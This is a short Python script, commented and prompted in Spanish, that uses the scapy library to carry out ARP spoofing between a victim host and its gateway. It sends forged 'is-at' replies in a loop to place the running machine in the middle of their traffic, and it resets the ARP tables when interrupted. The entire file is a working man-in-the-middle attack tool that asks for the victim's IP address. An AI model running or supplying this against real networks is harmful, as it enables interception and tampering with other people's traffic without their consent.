from scapy.all import Ether, ARP, srp, send
import time

def get_mac(ip):

    ans, _ = srp(Ether(dst = 'ff:ff:ff:ff:ff:ff') / ARP(pdst = ip), timeout = 3, verbose = 0)
    if ans:
        return ans[0][1].src

def spoof(target_ip, host_ip, verbose = True):
    target_mac = get_mac(target_ip)

    arp_response = ARP(pdst = target_ip, hwdst = target_mac, psrc = host_ip, op = 'is-at')

    send(arp_response, verbose = 0)

    if verbose:
        self_mac = ARP().hwsrc

        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

def restablecer(target_ip, host_ip, verbose = True):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))


# victim ip address
target = input("[+] Introduce la direccion IP de la victima: ")
# gateway ip address
host = input("[+] Introduce la direccion de Gateway: ")
# print progress to the screen
verbose = True
# enable ip forwarding
    
try:
    while True:
    
        # diciendole al 'target' (victima) que nosotros somos el gateway
        spoof(target, host, verbose)
        
        # diciendole a host que nosotros somos el target
        spoof(host, target, verbose)
        # delay de 1 segundo
        time.sleep(1)
except KeyboardInterrupt:
    print("[!] Se detecto CTRL+C ! restableciendo la red, espere porfavor...")
    restablecer(target, host)
    restablecer(host, target)
